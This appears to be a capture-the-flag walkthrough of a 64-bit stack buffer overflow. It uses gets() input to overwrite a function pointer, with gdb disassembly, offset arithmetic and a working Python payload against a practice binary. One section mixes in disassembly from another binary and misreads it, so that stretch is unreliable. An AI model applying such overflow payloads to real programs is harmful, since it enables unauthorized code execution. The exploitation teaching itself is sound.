Let's look at the source code...

```
#include <stdio.h>
#include <stdlib.h>

int nothing_interesting()
{

    printf("Level Cleared\n");
}

int main()
{
    char buf1[55];
    char buf0[300];
    volatile int (*var1)();
    var1 = 0;

    gets(buf0);

    if (var1)
    {
        printf("Wait, you aren't supposed to be here\n");
        var1();
    }

    else
    {
        printf("O look you didn't solve this. How very predictable\n");
    }
}
```

So we can see that our objective lies in the nothing_interesting() function. However it doesn't call it anywhere in the main function.
However it does call a function, which was declared as a volatile int. In addition to that it has a buffer overflow vulnerabillity where it uses gets() to read into buf0.
So we should be able to exploit this program by overflowing buf0 to rewrite var1 with the address of the nothing_interesting() function.
This way, the if then statement will evaluate as true and when the var1() call runs, it will run the nothing_interesting() function. Also
buf1 doesn't serve any purpose as far as I can tell. It's just there to troll with you. So let's solve this with gdb.

First fire up gdb
```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b1_64$ gdb ./b1_64
```

One wall of text later...

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400566 <+0>: push   rbp
   0x0000000000400567 <+1>: mov    rbp,rsp
   0x000000000040056a <+4>: sub    rsp,0x1f0
   0x0000000000400571 <+11>:    lea    rax,[rbp-0x1f0]
   0x0000000000400578 <+18>:    mov    rdi,rax
   0x000000000040057b <+21>:    mov    eax,0x0
   0x0000000000400580 <+26>:    call   0x400450 <gets@plt>
   0x0000000000400585 <+31>:    cmp    DWORD PTR [rbp-0x4],0x44864486
   0x000000000040058c <+38>:    jne    0x400598 <main+50>
   0x000000000040058e <+40>:    mov    edi,0x400628
   0x0000000000400593 <+45>:    call   0x400430 <puts@plt>
   0x0000000000400598 <+50>:    mov    eax,0x0
   0x000000000040059d <+55>:    leave  
   0x000000000040059e <+56>:    ret    
End of assembler dump.
```

So right now, we are looking at the assembly code. First thing we should figure out is how much data we will need to input in order to overflow the buffer and write over the
var1 volatile int. Let's see if we can find out where in memeory the buffer starts.

```
   0x0000000000400571 <+11>:    lea    rax,[rbp-0x1f0]
   0x0000000000400578 <+18>:    mov    rdi,rax
   0x000000000040057b <+21>:    mov    eax,0x0
   0x0000000000400580 <+26>:    call   0x400450 <gets@plt>
```

Looking here we can see the assembly call for the gets() function. We know that the gets() function uses buf0 (the buffer we are after) as it's argument.
Thing is we see the lea instruction with a stack position. The lea address prepares an area of memory (like a buffer) to be pushed onto the stack and used by a function.
Since function paramters are pushed onto the stack right before the function is called, it is probably the buffer we are after which is stored at rbp-0x1f0.

Next we need to see where the int is stored. We know that it is used in an if then statement, which assembly does that through the use of a cmp function (cmp function just compares two things by subtracting one from another).

```
   0x0000000000400585 <+31>:    cmp    DWORD PTR [rbp-0x4],0x44864486
   0x000000000040058c <+38>:    jne    0x400598 <main+50>
```

So we can see that a value on the stack is being compared to 0 (which is what ints are compared to in an if then statment like the one were dealing with).
So we can be pretty sure that the stack location is ebp-0xc.

So we need to find out the stack locations of the int and the char. Let's fire up gdb.

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400577 <+0>: push   rbp
   0x0000000000400578 <+1>: mov    rbp,rsp
   0x000000000040057b <+4>: sub    rsp,0x170
   0x0000000000400582 <+11>:    mov    QWORD PTR [rbp-0x8],0x0
   0x000000000040058a <+19>:    lea    rax,[rbp-0x170]
   0x0000000000400591 <+26>:    mov    rdi,rax
   0x0000000000400594 <+29>:    mov    eax,0x0
   0x0000000000400599 <+34>:    call   0x400450 <gets@plt>
   0x000000000040059e <+39>:    cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004005a3 <+44>:    je     0x4005bc <main+69>
   0x00000000004005a5 <+46>:    mov    edi,0x400668
   0x00000000004005aa <+51>:    call   0x400430 <puts@plt>
   0x00000000004005af <+56>:    mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004005b3 <+60>:    mov    eax,0x0
   0x00000000004005b8 <+65>:    call   rdx
   0x00000000004005ba <+67>:    jmp    0x4005c6 <main+79>
   0x00000000004005bc <+69>:    mov    edi,0x400690
   0x00000000004005c1 <+74>:    call   0x400430 <puts@plt>
   0x00000000004005c6 <+79>:    mov    eax,0x0
   0x00000000004005cb <+84>:    leave  
   0x00000000004005cc <+85>:    ret    
End of assembler dump.
gdb-peda$ b *main+39
Breakpoint 1 at 0x40059e
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b2_64/b2_64 
75395128
```

One wall of text later...

```
Breakpoint 1, 0x000000000040059e in main ()
gdb-peda$ x $rbp-0x170
0x7fffffffdcf0: 0x3832313539333537
gdb-peda$ x $rbp-0x8
0x7fffffffde58: 0x0000000000000000
```
And switching over to python

```
>>> 0x7fffffffdcf0 - 0x7fffffffde58
-360
```

So as you can see, the difference is 360 bytes (reason why it is negative is because we subtraced the larger address from the smaller address). So we should be able to write 361 characters and overflow the variable. Let's try it.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b2_64$ python -c 'print "0"*361' | ./b2_64 
Wait, you aren't supposed to be here
Segmentation fault (core dumped)
```

So we have determined the buffer. Next thing is we need the address of the nothing_interesting() function. We can get it using objdump.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b2_64$ objdump -D b2_64 | grep nothing
0000000000400566 <nothing_interesting>:
```

So we have the address of the nothing_interesting() function which is 0x0000000000400566. So let's consrtuct the payload. Our payload will consist of two entities.

```
Filler = 360 characters

Address = 0x0000000000400566 (in little endian)
```

So let's try our exploit...

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b2_64$ python -c 'print "0"*360 + "\x66\x05\x40\x00\x00\x00\x00\x00"' | ./b2_64 
Wait, you aren't supposed to be here
Level Cleared
```

And just like that, we pwned the binary. 

